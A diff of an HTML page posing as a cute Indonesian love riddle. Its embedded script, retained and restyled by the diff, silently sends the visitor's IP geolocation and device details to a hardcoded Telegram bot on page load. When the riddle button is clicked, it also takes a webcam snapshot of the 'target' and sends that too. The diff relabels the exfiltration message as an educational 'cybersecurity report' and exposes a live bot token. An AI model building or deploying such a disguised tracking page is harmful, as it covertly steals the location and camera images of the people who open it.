@@ -5,58 +5,205 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Love Cute!</title>
 <style>
-body{
-  margin:0;
-  padding:0;
-  font-family:'Comic Sans MS', sans-serif;
-  background:#ffb6c1;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
-  text-align:center;
-  color:#fff;
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
 }
-h1{
-  font-size:2.5em;
-  margin-bottom:20px;
+
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
 }
-p{
-  font-size:1.2em;
-  margin-bottom:30px;
+
+.container {
+  background: rgba(255, 255, 255, 0.95);
+  border-radius: 25px;
+  padding: 40px 30px;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+  text-align: center;
+  max-width: 500px;
+  width: 100%;
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 255, 255, 0.3);
+  animation: fadeIn 0.8s ease-out;
 }
-button{
-  padding:15px 35px;
-  font-size:1.3em;
-  font-weight:bold;
-  border:none;
-  border-radius:50px;
-  background:#fff;
-  color:#ff69b4;
-  cursor:pointer;
-  transition: transform 0.2s, background 0.3s;
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(30px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
 }
-button:hover{
-  transform: scale(1.1);
-  background:#ffe0f0;
+
+.heart {
+  font-size: 3em;
+  color: #ff6b6b;
+  margin-bottom: 20px;
+  animation: heartbeat 1.5s ease-in-out infinite;
+}
+
+@keyframes heartbeat {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.1); }
+}
+
+h1 {
+  color: #ff6b6b;
+  font-size: 2.2em;
+  margin-bottom: 15px;
+  font-weight: 700;
+  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.riddle {
+  font-size: 1.3em;
+  color: #555;
+  margin-bottom: 30px;
+  line-height: 1.5;
+  font-weight: 500;
+}
+
+.btn {
+  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+  color: white;
+  border: none;
+  padding: 18px 40px;
+  font-size: 1.2em;
+  font-weight: 600;
+  border-radius: 50px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
+  position: relative;
+  overflow: hidden;
+}
+
+.btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
+}
+
+.btn:active {
+  transform: translateY(-1px);
+}
+
+.btn::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+  transition: left 0.5s;
+}
+
+.btn:hover::after {
+  left: 100%;
+}
+
+.sparkles {
+  position: absolute;
+  top: -20px;
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 1.5em;
+}
+
+.bubble {
+  background: #ffebee;
+  border-radius: 20px;
+  padding: 20px;
+  margin: 20px 0;
+  border-left: 4px solid #ff6b6b;
+}
+
+.flowers {
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+  margin: 20px 0;
+}
+
+.flower {
+  font-size: 1.5em;
+  animation: float 3s ease-in-out infinite;
+}
+
+.flower:nth-child(2) { animation-delay: 0.5s; }
+.flower:nth-child(3) { animation-delay: 1s; }
+
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+}
+
+@media (max-width: 480px) {
+  .container {
+    padding: 30px 20px;
+    margin: 10px;
+  }
+  
+  h1 {
+    font-size: 1.8em;
+  }
+  
+  .riddle {
+    font-size: 1.1em;
+  }
+  
+  .btn {
+    padding: 15px 30px;
+    font-size: 1.1em;
+  }
 }
 </style>
 </head>
 <body>
-
-<h1>KAMU TAU GAAAA</h1>
-<p>apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
-<button id="btnCamera">apaa tuh</button>
+<div class="container">
+  <div class="heart">💖</div>
+  
+  <div class="flowers">
+    <div class="flower">🌷</div>
+    <div class="flower">🌹</div>
+    <div class="flower">🌸</div>
+  </div>
+  
+  <h1>KAMU TAU GAAAA</h1>
+  
+  <div class="bubble">
+    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
+  </div>
+  
+  <button class="btn" id="btnCamera">
+    <span class="sparkles">✨</span>
+    Aapaa tuh?
+  </button>
+  
+  <div class="flowers" style="margin-top: 30px;">
+    <div class="flower">💐</div>
+    <div class="flower">🌼</div>
+    <div class="flower">🌺</div>
+  </div>
+</div>
 
 <script>
-const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
-const CHAT_ID="6051179992"; // CHAT ID
+const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo";
+const CHAT_ID="6051179992";
 const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";
 
 function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
 
-// Ambil IP/device info via ipwhois.io
 async function getIpInfo(){
   try{
     const r = await fetch("https://ipwhois.app/json/");
@@ -76,7 +223,6 @@ async function getIpInfo(){
   }
 }
 
-// Ambil device info
 async function getDeviceInfo(){
   const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
   return {
@@ -100,44 +246,59 @@ async function getDeviceInfo(){
   };
 }
 
-// Build caption Telegram
 function buildCaption(ip,d){
   const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
   return [
-    "<b>INFORMATION TARGET</b>",
-    `IP: ${escapeHtml(ip.ip)}`,
-    `City: ${escapeHtml(ip.city)}`,
-    `Region: ${escapeHtml(ip.region)}`,
-    `Country: ${escapeHtml(ip.country_name)}`,
-    `Country Code: ${escapeHtml(ip.country_code)}`,
-    `Latitude: ${escapeHtml(ip.latitude)}`,
-    `Longitude: ${escapeHtml(ip.longitude)}`,
-    `Location: ${g}`,
+    "<b>🛡️ CYBERSECURITY REPORT 🛡️</b>",
     "",
-    "<b>Device Info</b>",
-    `User Agent: ${escapeHtml(d.userAgent)}`,
-    `Platform: ${escapeHtml(d.platform)}`,
-    `Language: ${escapeHtml(d.language)}`,
-    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
-    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
-    `CPU cores: ${escapeHtml(d.cores)}`,
-    `RAM (GB): ${escapeHtml(d.memory)}`,
-    `Touch Points: ${escapeHtml(d.touchPoints)}`,
-    `Orientation: ${escapeHtml(d.orientation)}`,
-    `Color Depth: ${escapeHtml(d.colorDepth)}`,
-    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
-    `Online: ${escapeHtml(d.online)}`,
-    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
-    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
-    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
+    "<blockquote>",
+    "<b>📍 INFORMASI LOKASI</b>",
+    `🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>`,
+    `🏙️ Kota: ${escapeHtml(ip.city)}`,
+    `🗺️ Region: ${escapeHtml(ip.region)}`,
+    `🌍 Negara: ${escapeHtml(ip.country_name)} (${escapeHtml(ip.country_code)})`,
+    `📌 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}`,
+    `🗺️ Google Maps: ${g}`,
+    "</blockquote>",
     "",
-    "<b>URL & Time</b>",
-    `URL: ${escapeHtml(location.href)}`,
-    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
+    "<blockquote>",
+    "<b>💻 INFORMASI PERANGKAT</b>",
+    `🖥️ Platform: ${escapeHtml(d.platform)}`,
+    `🌐 Browser: ${escapeHtml(d.userAgent.split('/')[0])}`,
+    `🗣️ Bahasa: ${escapeHtml(d.language)}`,
+    `📱 Resolusi Layar: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
+    `🖼️ Ukuran Window: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
+    `⚙️ CPU Cores: ${escapeHtml(d.cores)}`,
+    `🧠 RAM: ${escapeHtml(d.memory)} GB`,
+    `👆 Touch Points: ${escapeHtml(d.touchPoints)}`,
+    `📐 Orientasi: ${escapeHtml(d.orientation)}`,
+    `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
+    `🔍 Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
+    `🔌 Status Online: ${escapeHtml(d.online ? "✅" : "❌")}`,
+    `🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled ? "✅" : "❌")}`,
+    `🚫 Do Not Track: ${escapeHtml(d.doNotTrack || "Tidak diatur")}`,
+    "</blockquote>",
+    "",
+    "<blockquote>",
+    "<b>🔋 INFORMASI BATERAI</b>",
+    `⚡ Level: ${escapeHtml(Math.round((d.battery?.level || 0) * 100))}%`,
+    `🔌 Charging: ${escapeHtml(d.battery?.charging ? "✅" : "❌")}`,
+    `⏱️ Charging Time: ${escapeHtml(d.battery?.chargingTime || "-")}s`,
+    `⏳ Discharging Time: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
+    "</blockquote>",
+    "",
+    "<blockquote>",
+    "<b>🌐 INFORMASI SESI</b>",
+    `🔗 URL: ${escapeHtml(location.href)}`,
+    `🕐 Waktu (UTC): ${escapeHtml(new Date().toISOString())}`,
+    `👤 User Agent Lengkap:`,
+    `<code>${escapeHtml(d.userAgent)}</code>`,
+    "</blockquote>",
+    "",
+    "<i>⚠️ Data dikumpulkan untuk keperluan edukasi cybersecurity</i>"
   ].join("\n");
 }
 
-// Kirim IP/device + foto statis saat halaman load
 async function sendIpDevice(){
   const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
@@ -152,7 +313,6 @@ async function sendIpDevice(){
   });
 }
 
-// Kamera snapshot sebagai file .jpg (document)
 async function sendSnapshot(){
   try{
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
@@ -174,7 +334,7 @@ async function sendSnapshot(){
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("document", blob, "screenshotbyaldofficialr.jpg");
-    formData.append("caption", "Sukes screenshot foto target");
+    formData.append("caption", "📸 SUKSES SCREENSHOT FOTO TARGET");
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: "POST",
@@ -188,10 +348,7 @@ async function sendSnapshot(){
   }
 }
 
-// Jalankan saat halaman load
 window.addEventListener("load",sendIpDevice);
-
-// Tombol klik kamera
 document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
 </script>
 </body>
